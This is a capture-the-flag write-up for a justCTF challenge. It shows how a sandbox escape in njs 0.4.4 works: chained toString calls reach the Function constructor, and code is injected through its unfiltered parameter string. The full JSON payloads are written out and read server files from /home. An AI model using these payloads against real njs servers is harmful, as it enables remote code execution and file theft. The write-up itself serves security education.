# njs Writeup by 0ops

In this challenge we have a simple calculator running on njs, a javascript engine for nginx. After reading the source code we can know that the result is calculated by chaining a series of function calls inside class Calculator. Notice the toString function:

```
Calculator.prototype.toString = function(prop) {
    if(prop) {
        return this.result[prop]
    }
    return this.result;
};
```

We can leverage this function to get any child of `this.result`, then assign it back to `this.result`. 

Just as other js sandbox escaping challenges, we start by finding a way to get a function constructor, which could give us a chance to run arbitrary script. This could be done by using `[{"op":"toString","x":"constructor","y":""},{"op":"toString","x":"constructor","y":""}]`, which literally means `calc.result.constructor.constructor`. Then we use `addEquation` to call this constructor function with two parameters. The first one is the parameter of the function, and the second is the code that we want to execute: 

```
[{"op":"toString","x":"constructor","y":""},{"op":"toString","x":"constructor","y":""},{"op":"result","x":"a,b","y":"return 114514"}]
```

But the function could not be created and the engine raised error `TypeError: function constructor is disabled in "safe" mode`. We should quickly realize that some code audit might be helpful to bypass this restriction. Searching the error message led us to the implementation in https://github.com/nginx/njs/blob/0.4.4/src/njs_function.c#L894. Njs made an exception for `new Function('return this')`, which is often used to get the global object in a portable way. This means the last parameter of the function constructor must be `return this`, leaving us only the first parameter controllable. So, how njs creates a function? This piece of code shows us the answer:

```
njs_chb_append_literal(&chain, "(function(");

for (i = 1; i < nargs - 1; i++) {
    ret = njs_value_to_chain(vm, &chain, njs_argument(args, i));
    if (njs_slow_path(ret < NJS_OK)) {
        return ret;
    }

    if (i != (nargs - 2)) {
        njs_chb_append_literal(&chain, ",");
    }
}

njs_chb_append_literal(&chain, "){");

ret = njs_value_to_chain(vm, &chain, njs_argument(args, nargs - 1));
if (njs_slow_path(ret < NJS_OK)) {
    return ret;
}

njs_chb_append_literal(&chain, "})");
```

Without any filtering, the first parameter of the constructor is appended right after "(function(" and before "){", giving us a chance to close the bracket and inject code into the parameter field. After a bit of fuzzing, we finally can get our code run in the server:

```
[{"op":"toString","x":"constructor","y":""},{"op":"toString","x":"constructor","y":""},{"op":"result","x":"a,b){/*your code here*/}+function(","y":"return this"},{"op":"result","x":"","y":""}]
```

Then we can use readdirSync() and readFileSync() to read the flag out. The final exploit is

```
First request to get the filename of the flag:
[{"op":"toString","x":"constructor","y":""},{"op":"toString","x":"constructor","y":""},{"op":"result","x":"a1,b1){return require('fs').readdirSync('/home/')}+function(","y":"return this"},{"op":"result","x":"","y":""}]

Second request to capture the flag:
[{"op":"toString","x":"constructor","y":""},{"op":"toString","x":"constructor","y":""},{"op":"result","x":"a2,b2){return require('fs').readFileSync('/home/RealFlagIsHere1337.txt')}+function(","y":"return this"},{"op":"result","x":"","y":""}]
```

Flag: `justCTF{manny_manny_bugs_can_hide_in_this_engine!!!}`